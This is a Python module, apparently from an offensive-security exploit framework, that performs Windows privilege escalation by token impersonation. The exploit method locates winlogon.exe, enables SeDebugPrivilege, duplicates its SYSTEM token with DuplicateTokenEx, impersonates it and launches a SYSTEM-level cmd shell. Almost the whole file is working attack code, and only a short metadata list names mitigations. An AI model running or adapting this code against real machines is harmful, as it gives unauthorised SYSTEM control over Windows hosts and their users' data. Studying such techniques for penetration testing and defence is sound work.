"""
Windows Token Impersonation Privilege Escalation Module

This exploit locates a SYSTEM‐level process (e.g., winlogon.exe),
duplicates its token, and impersonates it to spawn a SYSTEM shell.

Requirements:
  * Windows OS
  * SeDebugPrivilege enabled for the current process
  * pywin32  (pip install pywin32)
  * psutil   (pip install psutil)
"""

import subprocess
from typing import Dict, Any, Optional

import psutil
import win32api
import win32con
import win32event
import win32process
import win32security

from modules.exploits.exploit_template import Exploit, ExploitResult
from core.logging import setup_logger

logger = setup_logger(__name__, default_level="INFO")


class WindowsTokenImpersonation(Exploit):
    name = "Windows Token Impersonation"
    description = (
        "Duplicate a SYSTEM process token (winlogon.exe by default), "
        "impersonate it, and spawn a SYSTEM shell."
    )
    target_platforms = ["Windows"]
    severity = "High"
    requires_auth = False
    metadata: Dict[str, Any] = {
        "cve_id": None,
        "references": [
            "https://docs.microsoft.com/windows/win32/secauthz/access-tokens",
            "https://github.com/SecWiki/windows-kernel-exploits"
        ],
        "mitigation_steps": [
            "Restrict SeDebugPrivilege to trusted accounts",
            "Harden service accounts and endpoint protection"
        ]
    }

    SYSTEM_PROCESS = "winlogon.exe"
    SHELL_CMD = ["cmd.exe", "/c", "start", "cmd.exe"]  # Launch new elevated cmd

    def check(self) -> bool:
        # 1) Ensure we're on Windows
        if not win32api.GetVersionEx()[0] == 10:
            logger.warning("Not running on Windows 10+, aborting.")
            return False

        # 2) Verify SeDebugPrivilege is available
        try:
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
            )
            luid = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
            # Try a dry‐run adjust
            win32security.AdjustTokenPrivileges(
                token,
                False,
                [(luid, win32con.SE_PRIVILEGE_ENABLED)]
            )
            logger.debug("SeDebugPrivilege is available.")
            return True
        except Exception as e:
            logger.error("Missing SeDebugPrivilege: %s", e, exc_info=True)
            return False

    def exploit(self) -> ExploitResult:
        try:
            pid = self._find_system_process(self.SYSTEM_PROCESS)
            if pid is None:
                return ExploitResult(False, f"Could not find {self.SYSTEM_PROCESS}")

            logger.info("Found SYSTEM process %s with PID %d", self.SYSTEM_PROCESS, pid)
            self._enable_debug_privilege()

            system_token = self._duplicate_system_token(pid)
            if not system_token:
                return ExploitResult(False, "Failed to duplicate system token")

            logger.info("Successfully duplicated SYSTEM token, impersonating...")
            win32security.ImpersonateLoggedOnUser(system_token)

            # Spawn SYSTEM shell and wait
            proc = win32process.CreateProcessAsUser(
                system_token,
                None,
                " ".join(self.SHELL_CMD),
                None,
                None,
                False,
                win32con.CREATE_NEW_CONSOLE,
                None,
                None,
                win32process.STARTUPINFO()
            )
            handle, _ = proc
            win32event.WaitForSingleObject(handle, win32con.INFINITE)

            return ExploitResult(True, "Spawned SYSTEM shell successfully.")

        except Exception as e:
            logger.error("Exploit failed: %s", e, exc_info=True)
            return ExploitResult(False, f"Exception: {e}")

    def _find_system_process(self, name: str) -> Optional[int]:
        for proc in psutil.process_iter(["name", "pid"]):
            if proc.info["name"].lower() == name.lower():
                return proc.info["pid"]
        return None

    def _enable_debug_privilege(self) -> None:
        # Grant SeDebugPrivilege to our process
        token = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
        )
        luid = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(
            token,
            False,
            [(luid, win32con.SE_PRIVILEGE_ENABLED)]
        )
        logger.debug("Enabled SeDebugPrivilege.")

    def _duplicate_system_token(self, pid: int):
        # Open the SYSTEM process and its token
        h_proc = win32api.OpenProcess(
            win32con.PROCESS_QUERY_INFORMATION, False, pid
        )
        h_token = win32security.OpenProcessToken(
            h_proc, win32con.TOKEN_DUPLICATE | win32con.TOKEN_ASSIGN_PRIMARY | win32con.TOKEN_QUERY
        )
        # Duplicate the token for impersonation
        return win32security.DuplicateTokenEx(
            h_token,
            win32con.MAXIMUM_ALLOWED,
            None,
            win32con.SecurityImpersonation,
            win32con.TokenPrimary
        )
